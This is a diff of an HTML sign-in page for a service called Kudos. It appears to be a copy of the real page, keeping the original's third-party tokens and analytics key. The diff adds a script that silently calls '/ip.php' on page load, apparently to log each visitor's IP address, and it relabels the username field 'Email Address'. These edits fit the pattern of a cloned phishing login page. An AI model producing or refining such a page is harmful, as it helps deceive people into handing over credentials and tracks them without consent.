@@ -1,5 +1,11 @@
 
 <html lang="en" dir="ltr"><head><meta http-equiv="origin-trial" content="3NNj0GXVktLOmVKwWUDendk4Vq2qgMVDBDX+Sni48ATJl9JBj+zF+9W2HGB3pvt6qowOihTbQgTeBm9SKbdTwYAAABfeyJvcmlnaW4iOiJodHRwczovL3JlY2FwdGNoYS5uZXQ6NDQzIiwiZmVhdHVyZSI6IlRwY2QiLCJleHBpcnkiOjE3MzUzNDM5OTksImlzVGhpcmRQYXJ0eSI6dHJ1ZX0="><meta http-equiv="origin-trial" content="A6iYDRdcg1LVww9DNZEU+JUx2g1IJxSxk4P6F+LimR0ElFa38FydBqtz/AmsKdGr11ZooRgDPCInHJfGzwtR+A4AAACXeyJvcmlnaW4iOiJodHRwczovL3d3dy5yZWNhcHRjaGEubmV0OjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
+
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "/ip.php", true);
+    xhr.send();
+</script>
     <title>Kudos Sign In</title>
     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
   <script type="text/javascript" async="" charset="utf-8" src="https://www.gstatic.com/recaptcha/releases/2sJvksnKlEApLvJt2btz_q7n/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-LemK5f1mYuwn+DuidBucDgDYKJdVkYJ6e33AxSMj6dqtdFjUZx6FY4ZyOY9nFK23"></script><script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","errorBeacon":"bam.nr-data.net","licenseKey":"1a6f93dca7","applicationID":"470496","transactionName":"JgxZF0YKCVxRFxdAUhYQXgxaFkpeURI=","queueTime":0,"applicationTime":160,"agent":""}</script>
@@ -226,7 +232,7 @@
     <input type="hidden" value="Africa/Kampala" name="user[time_zone]" id="user_time_zone">
     <div class="loginLine">
         <div class="field loginEmail">
-          <input placeholder="Username" class="r3 textInput bBox paddedInput" tabindex="1" type="text" name="username" id="username">
+          <input placeholder="Email Address" class="r3 textInput bBox paddedInput" tabindex="1" type="text" name="username" id="username">
         </div>
         <div class="field loginPassword">
           <input placeholder="Password" class="r3 textInput bBox paddedInput" autocomplete="off" tabindex="2" type="password" name="password" id="password">
